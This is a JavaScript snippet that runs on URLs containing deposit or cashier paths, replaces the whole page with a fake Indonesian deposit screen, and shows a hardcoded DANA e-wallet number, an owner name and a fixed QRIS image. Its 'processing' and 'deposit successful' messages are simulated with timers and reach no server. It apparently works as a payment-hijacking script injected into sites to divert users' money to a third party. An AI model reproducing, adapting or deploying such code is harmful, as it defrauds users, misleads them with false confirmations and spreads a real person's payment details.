(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --primary-blue: #2563eb;
        --blue-dark: #1e40af;
        --blue-light: #3b82f6;
        --blue-soft: #60a5fa;
        --black-dark: #0f172a;
        --black-light: #1e293b;
        --black-lighter: #334155;
        --gray-dark: #475569;
        --gray-light: #94a3b8;
        --white: #f8fafc;
        --success: #10b981;
        --warning: #f59e0b;
        --danger: #ef4444;
        --border-radius: 12px;
        --border-radius-sm: 8px;
        --box-shadow: 0 4px 12px rgba(0, 30, 84, 0.15);
        --box-shadow-hover: 0 6px 20px rgba(0, 30, 84, 0.25);
        --transition: all 0.2s ease;
        --gradient-blue: linear-gradient(135deg, var(--primary-blue) 0%, var(--blue-light) 100%);
        --gradient-dark: linear-gradient(135deg, var(--black-dark) 0%, var(--black-light) 100%);
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
      }
      
      body {
        font-family: 'Poppins', sans-serif;
        background: var(--gradient-dark);
        color: var(--white);
        min-height: 100vh;
        padding: 0;
        line-height: 1.4;
        overflow-x: hidden;
        touch-action: manipulation;
      }
      
      .app-container {
        width: 100%;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        max-width: 100%;
        margin: 0 auto;
      }
      
      .header {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 100%);
        padding: 16px;
        text-align: center;
        border-bottom: 1px solid rgba(59, 130, 246, 0.3);
        position: sticky;
        top: 0;
        z-index: 100;
        backdrop-filter: blur(10px);
      }
      
      .header-content {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 6px;
      }
      
      .header h1 {
        font-size: 18px;
        font-weight: 700;
        display: flex;
        align-items: center;
        gap: 8px;
        color: var(--blue-soft);
      }
      
      .header p {
        font-size: 12px;
        color: var(--gray-light);
        font-weight: 400;
        max-width: 90%;
        opacity: 0.9;
      }
      
      .alert-banner {
        background: rgba(245, 158, 11, 0.1);
        border-bottom: 1px solid rgba(245, 158, 11, 0.2);
        padding: 10px 16px;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 12px;
        color: #fde68a;
      }
      
      .alert-banner i {
        color: var(--warning);
        flex-shrink: 0;
      }
      
      .main-content {
        flex: 1;
        padding: 16px;
        max-width: 100%;
        overflow-y: auto;
        -webkit-overflow-scrolling: touch;
      }
      
      .tabs-container {
        display: flex;
        gap: 8px;
        margin-bottom: 16px;
        background: rgba(15, 23, 42, 0.7);
        padding: 6px;
        border-radius: var(--border-radius-sm);
        border: 1px solid rgba(59, 130, 246, 0.2);
      }
      
      .tab-btn {
        flex: 1;
        background: transparent;
        border: none;
        color: var(--gray-light);
        padding: 12px 8px;
        border-radius: 6px;
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        white-space: nowrap;
      }
      
      .tab-btn.active {
        background: rgba(59, 130, 246, 0.2);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
      }
      
      .help-btn {
        width: 100%;
        background: rgba(139, 92, 246, 0.1);
        color: #c4b5fd;
        border: 1px solid rgba(139, 92, 246, 0.3);
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        margin-bottom: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      
      .form-section {
        display: none;
        animation: fadeIn 0.3s ease;
      }
      
      .form-section.active {
        display: block;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .form-group {
        margin-bottom: 16px;
      }
      
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-size: 13px;
        font-weight: 600;
        color: var(--blue-soft);
      }
      
      select, input {
        width: 100%;
        padding: 14px;
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(59, 130, 246, 0.3);
        border-radius: var(--border-radius-sm);
        font-size: 14px;
        color: var(--white);
        transition: var(--transition);
        font-family: 'Poppins', sans-serif;
        -webkit-appearance: none;
        appearance: none;
      }
      
      select:focus, input:focus {
        outline: none;
        border-color: var(--blue-light);
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
      }
      
      .bank-card {
        background: rgba(15, 23, 42, 0.8);
        border-radius: var(--border-radius);
        padding: 16px;
        margin-top: 12px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        display: none;
        box-shadow: var(--box-shadow);
      }
      
      .bank-card.active {
        display: block;
        animation: slideUp 0.3s ease;
      }
      
      @keyframes slideUp {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .bank-header {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 16px;
        padding-bottom: 12px;
        border-bottom: 1px solid rgba(59, 130, 246, 0.2);
      }
      
      .bank-logo {
        width: 50px;
        height: 50px;
        border-radius: 8px;
        object-fit: contain;
        background: white;
        padding: 6px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        flex-shrink: 0;
      }
      
      .bank-info h3 {
        font-size: 16px;
        margin-bottom: 4px;
        color: var(--blue-light);
        font-weight: 700;
      }
      
      .bank-info p {
        font-size: 12px;
        color: var(--gray-light);
        font-weight: 400;
      }
      
      .account-number {
        background: rgba(15, 23, 42, 0.9);
        border-radius: var(--border-radius-sm);
        padding: 16px;
        margin-bottom: 16px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        position: relative;
      }
      
      .account-number::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 3px;
        height: 100%;
        background: var(--gradient-blue);
      }
      
      .account-number p {
        font-size: 12px;
        color: var(--gray-light);
        margin-bottom: 8px;
        font-weight: 500;
      }
      
      .number-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 12px;
      }
      
      .number-container span {
        font-size: 16px;
        font-weight: 700;
        letter-spacing: 1px;
        font-family: 'Courier New', monospace;
        color: var(--blue-soft);
        word-break: break-all;
      }
      
      .copy-btn {
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
        border-radius: 6px;
        padding: 8px 12px;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        gap: 6px;
        flex-shrink: 0;
        white-space: nowrap;
      }
      
      .copy-btn:active {
        transform: scale(0.95);
      }
      
      .info-box {
        background: rgba(59, 130, 246, 0.1);
        border-left: 3px solid var(--blue-light);
        padding: 12px;
        border-radius: 0 6px 6px 0;
        margin: 12px 0;
        font-size: 12px;
        color: var(--blue-soft);
        display: flex;
        align-items: flex-start;
        gap: 8px;
      }
      
      .info-box i {
        color: var(--blue-light);
        margin-top: 1px;
        flex-shrink: 0;
      }
      
      .info-box.warning {
        background: rgba(245, 158, 11, 0.1);
        border-left-color: var(--warning);
        color: #fde68a;
      }
      
      .info-box.warning i {
        color: var(--warning);
      }
      
      .action-btn {
        width: 100%;
        background: rgba(16, 185, 129, 0.2);
        color: #a7f3d0;
        border: 1px solid rgba(16, 185, 129, 0.4);
        padding: 16px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        margin-top: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      
      .action-btn:active {
        transform: scale(0.98);
      }
      
      .action-btn:disabled {
        background: rgba(71, 85, 105, 0.3);
        border-color: rgba(71, 85, 105, 0.5);
        color: var(--gray-light);
        cursor: not-allowed;
        transform: none;
      }
      
      .qr-container {
        text-align: center;
        margin-top: 16px;
        display: none;
        background: rgba(15, 23, 42, 0.8);
        border-radius: var(--border-radius);
        padding: 16px;
        border: 1px solid rgba(59, 130, 246, 0.25);
      }
      
      .qr-container.active {
        display: block;
        animation: fadeIn 0.3s ease;
      }
      
      .qr-code {
        width: 180px;
        height: 180px;
        border-radius: var(--border-radius-sm);
        margin: 0 auto 16px;
        border: 2px solid rgba(59, 130, 246, 0.3);
        padding: 12px;
        background: white;
      }
      
      .qr-code img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      
      .qr-actions {
        display: flex;
        gap: 8px;
        margin-top: 16px;
      }
      
      .qr-actions button {
        flex: 1;
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: var(--transition);
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
      }
      
      .download-btn {
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
      }
      
      .done-btn {
        background: rgba(16, 185, 129, 0.15);
        color: #a7f3d0;
        border: 1px solid rgba(16, 185, 129, 0.4);
      }
      
      .spinner {
        width: 40px;
        height: 40px;
        border: 3px solid rgba(59, 130, 246, 0.1);
        border-top: 3px solid var(--blue-light);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      
      @keyframes spin {
        to { transform: rotate(360deg); }
      }
      
      .footer {
        text-align: center;
        padding: 16px;
        border-top: 1px solid rgba(59, 130, 246, 0.2);
        background: rgba(15, 23, 42, 0.8);
      }
      
      .footer img {
        max-width: 200px;
        border-radius: var(--border-radius-sm);
        border: 1px solid rgba(59, 130, 246, 0.3);
      }
      
      .toast {
        position: fixed;
        bottom: 20px;
        left: 16px;
        right: 16px;
        transform: translateY(100px);
        text-align: center;
        padding: 14px;
        border-radius: var(--border-radius-sm);
        font-size: 14px;
        font-weight: 500;
        opacity: 0;
        pointer-events: none;
        transition: transform 0.3s ease, opacity 0.3s ease;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        max-width: calc(100% - 32px);
      }
      
      .toast.show {
        opacity: 1;
        transform: translateY(0);
      }
      
      .toast.success {
        background: rgba(16, 185, 129, 0.9);
        color: white;
      }
      
      .toast.error {
        background: rgba(239, 68, 68, 0.9);
        color: white;
      }
      
      .toast.info {
        background: rgba(59, 130, 246, 0.9);
        color: white;
      }
      
      .result-container {
        margin-top: 16px;
        animation: fadeIn 0.3s ease;
      }
      
      /* Mobile Optimizations */
      @media (max-width: 480px) {
        .header {
          padding: 14px 16px;
        }
        
        .main-content {
          padding: 14px;
        }
        
        .tabs-container {
          flex-direction: row;
        }
        
        .tab-btn {
          padding: 10px 6px;
          font-size: 12px;
        }
        
        .qr-code {
          width: 160px;
          height: 160px;
        }
        
        .qr-actions {
          flex-direction: row;
        }
        
        .qr-actions button {
          padding: 12px;
        }
        
        select, input {
          padding: 12px;
          font-size: 13px;
        }
        
        .action-btn {
          padding: 14px;
          font-size: 14px;
        }
        
        .footer {
          padding: 12px;
        }
      }
      
      @media (max-height: 700px) {
        .header h1 {
          font-size: 16px;
        }
        
        .header p {
          font-size: 11px;
        }
        
        .form-group {
          margin-bottom: 12px;
        }
        
        .bank-logo {
          width: 45px;
          height: 45px;
        }
        
        .qr-code {
          width: 150px;
          height: 150px;
        }
      }
      
      /* Prevent zoom on input focus on mobile */
      @media screen and (max-width: 768px) {
        input, select, textarea {
          font-size: 16px;
        }
      }
      
      /* Hide scrollbar but keep functionality */
      .main-content::-webkit-scrollbar {
        width: 4px;
      }
      
      .main-content::-webkit-scrollbar-track {
        background: transparent;
      }
      
      .main-content::-webkit-scrollbar-thumb {
        background: rgba(59, 130, 246, 0.3);
        border-radius: 2px;
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="app-container">
      <div class="header">
        <div class="header-content">
          <h1><i class="fas fa-coins"></i> Deposit</h1>
          <p>Transfer cepat & aman</p>
        </div>
      </div>
      
      <div class="alert-banner">
        <i class="fas fa-exclamation-circle"></i>
        <span>Min. Rp 50.000 | Transaksi pertama +123</span>
      </div>
      
      <div class="main-content">
        <div class="tabs-container">
          <button class="tab-btn active" onclick="switchTab('manual')">
            <i class="fas fa-hand-holding-usd"></i> Manual
          </button>
          <button class="tab-btn" onclick="switchTab('auto')">
            <i class="fas fa-qrcode"></i> QRIS
          </button>
        </div>
        
        <button class="help-btn" onclick="openHelp()">
          <i class="fas fa-headset"></i> Bantuan
        </button>
        
        <!-- Manual Deposit Section -->
        <div id="manual-section" class="form-section active">
          <div class="form-group">
            <label for="bank-select">Metode Pembayaran</label>
            <select id="bank-select" onchange="selectMethod(this.value)">
              <option value="" selected disabled>Pilih metode...</option>
              <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"DANA","number":"0895327827948","owner":"M ALVIN"}'>DANA</option>
            </select>
          </div>
          
          <div id="bank-card" class="bank-card">
            <div class="bank-header">
              <img id="bank-logo" class="bank-logo" src="" alt="Bank Logo">
              <div class="bank-info">
                <h3 id="bank-name"></h3>
                <p id="bank-owner"></p>
              </div>
            </div>
            
            <div class="account-number">
              <p>Nomor Rekening / E-Wallet</p>
              <div class="number-container">
                <span id="bank-number"></span>
                <button class="copy-btn" onclick="copyNumber()">
                  <i class="far fa-copy"></i> Salin
                </button>
              </div>
            </div>
            
            <div class="info-box warning">
              <i class="fas fa-exclamation-triangle"></i>
              Transfer ke nomor di atas. Cek ulang sebelum kirim.
            </div>
            
            <div class="form-group">
              <label for="manual-nominal">Nominal Deposit</label>
              <input id="manual-nominal" type="number" min="50000" placeholder="Contoh: 50000" inputmode="numeric">
            </div>
            
            <button class="action-btn" onclick="submitManualDeposit()" id="manual-submit-btn">
              <i class="fas fa-paper-plane"></i> Kirim Deposit
            </button>
            
            <div id="manual-result" class="result-container"></div>
          </div>
        </div>
        
        <!-- QRIS Section -->
        <div id="auto-section" class="form-section">
          <div class="form-group">
            <label for="auto-nominal">Nominal Deposit</label>
            <input id="auto-nominal" type="number" min="50000" placeholder="Contoh: 50000" inputmode="numeric">
          </div>
          
          <div class="info-box">
            <i class="fas fa-info-circle"></i>
            DANA, OVO, ShopeePay, GoPay, Mobile Banking
          </div>
          
          <button class="action-btn" onclick="generateQRIS()" id="qris-generate-btn">
            <i class="fas fa-qrcode"></i> Buat QRIS
          </button>
          
          <div id="qr-container" class="qr-container">
            <div class="qr-code">
              <img id="qris-img" src="" alt="QR Code">
            </div>
            
            <div class="info-box">
              <i class="fas fa-camera"></i>
              Scan dengan aplikasi e-wallet/mobile banking
            </div>
            
            <div class="qr-actions">
              <button class="download-btn" onclick="downloadQRIS()">
                <i class="fas fa-download"></i> Download
              </button>
              <button class="done-btn" onclick="finishPayment()">
                <i class="fas fa-check-circle"></i> Sudah Bayar
              </button>
            </div>
          </div>
          
          <div id="auto-result" class="result-container"></div>
        </div>
      </div>
      
      <div class="footer">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment">
      </div>
    </div>
    
    <div id="toast" class="toast"></div>
  `;

  // Toast Notification
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    const icon = {
      success: 'check-circle',
      error: 'exclamation-circle',
      info: 'info-circle'
    }[type];
    
    toast.innerHTML = `
      <i class="fas fa-${icon}"></i>
      <span>${msg}</span>
    `;
    toast.className = `toast ${type}`;
    
    toast.offsetHeight;
    toast.classList.add("show");
    
    setTimeout(() => {
      toast.classList.remove("show");
    }, 2000);
  }

  // Tab Switching
  window.switchTab = function (tab) {
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.classList.remove('active');
    });
    
    if (tab === 'manual') {
      document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
      document.getElementById('manual-section').classList.add('active');
      document.getElementById('auto-section').classList.remove('active');
      document.getElementById('qr-container').classList.remove('active');
      document.getElementById('auto-nominal').value = '';
      document.getElementById('auto-result').innerHTML = '';
    } else {
      document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
      document.getElementById('auto-section').classList.add('active');
      document.getElementById('manual-section').classList.remove('active');
      document.getElementById('bank-card').classList.remove('active');
      document.getElementById('bank-select').value = '';
      document.getElementById('manual-nominal').value = '';
      document.getElementById('manual-result').innerHTML = '';
    }
  };

  // Select Payment Method
  window.selectMethod = function (jsonStr) {
    if (!jsonStr) {
      document.getElementById('bank-card').classList.remove('active');
      return;
    }
    
    try {
      const method = JSON.parse(jsonStr);
      document.getElementById('bank-logo').src = method.logo;
      document.getElementById('bank-name').textContent = method.name;
      document.getElementById('bank-number').textContent = method.number;
      document.getElementById('bank-owner').textContent = `a/n ${method.owner}`;
      
      document.getElementById('bank-card').classList.add('active');
      document.getElementById('manual-nominal').value = '';
      document.getElementById('manual-result').innerHTML = '';
      
      showToast(`${method.name} dipilih`, 'info');
    } catch (error) {
      showToast('Gagal memuat metode', 'error');
    }
  };

  // Copy Account Number
  window.copyNumber = function () {
    const num = document.getElementById('bank-number').textContent;
    if (!num || num === '') {
      showToast('Nomor kosong', 'error');
      return;
    }
    
    navigator.clipboard.writeText(num).then(() => {
      showToast('Nomor disalin', 'success');
    }).catch(() => {
      const textArea = document.createElement('textarea');
      textArea.value = num;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      showToast('Nomor disalin', 'success');
    });
  };

  // Submit Manual Deposit
  window.submitManualDeposit = function () {
    const nominal = Number(document.getElementById('manual-nominal').value || 0);
    const bankCard = document.getElementById('bank-card');
    
    if (!bankCard.classList.contains('active')) {
      showToast('Pilih metode terlebih dahulu', 'error');
      return;
    }
    
    if (nominal < 50000) {
      showToast('Minimal Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('manual-submit-btn');
    const originalText = btn.innerHTML;
    
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
    
    const resultDiv = document.getElementById('manual-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      
      resultDiv.innerHTML = `
        <div class="info-box">
          <i class="fas fa-check-circle"></i>
          <div>
            <strong>Deposit Dikirim!</strong><br>
            Rp ${nominal.toLocaleString('id-ID')} sedang diproses.
          </div>
        </div>
      `;
      
      showToast('Deposit berhasil dikirim', 'success');
      
      setTimeout(() => {
        showToast('Kembali ke halaman', 'info');
        setTimeout(() => history.back(), 800);
      }, 3000);
    }, 1500);
  };

  // Generate QRIS
  window.generateQRIS = function () {
    const nominal = Number(document.getElementById('auto-nominal').value || 0);
    
    if (nominal < 50000) {
      showToast('Minimal Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('qris-generate-btn');
    const originalText = btn.innerHTML;
    
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Membuat...';
    
    const resultDiv = document.getElementById('auto-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      resultDiv.innerHTML = '';
      
      const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
      document.getElementById('qris-img').src = qrUrl;
      document.getElementById('qr-container').classList.add('active');
      
      showToast(`QRIS Rp ${nominal.toLocaleString('id-ID')} dibuat`, 'success');
      
      document.getElementById('qr-container').scrollIntoView({
        behavior: 'smooth',
        block: 'start'
      });
    }, 1200);
  };

  // Download QRIS
  window.downloadQRIS = function () {
    const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
    const link = document.createElement('a');
    link.href = qrUrl;
    link.download = `qris-${Date.now()}.png`;
    link.target = '_blank';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showToast('QRIS diunduh', 'success');
  };

  // Finish Payment
  window.finishPayment = function () {
    showToast('Pembayaran dikonfirmasi', 'success');
    
    setTimeout(() => {
      showToast('Proses deposit...', 'info');
      
      setTimeout(() => {
        showToast('Deposit berhasil', 'success');
        setTimeout(() => history.back(), 1000);
      }, 1500);
    }, 800);
  };

  // Open Help
  window.openHelp = function () {
    showToast('Buka Customer Service', 'info');
    
    setTimeout(() => {
      window.open("https://direct.lc.chat/19347249", "_blank");
    }, 300);
  };

  // Initialize
  window.addEventListener('DOMContentLoaded', () => {
    // Better input handling for mobile
    const inputs = document.querySelectorAll('input[type="number"]');
    inputs.forEach(input => {
      input.addEventListener('input', function() {
        if (this.value && Number(this.value) >= 50000) {
          this.style.borderColor = 'rgba(16, 185, 129, 0.6)';
        } else if (this.value && Number(this.value) < 50000) {
          this.style.borderColor = 'rgba(239, 68, 68, 0.6)';
        } else {
          this.style.borderColor = 'rgba(59, 130, 246, 0.3)';
        }
      });
    });
    
    // Prevent form submission on enter
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
      }
    });
    
    // Initial welcome
    setTimeout(() => {
      showToast('Sistem deposit siap', 'info');
    }, 500);
  });
  
  // Handle back button
  window.addEventListener('popstate', function() {
    history.back();
  });
})();
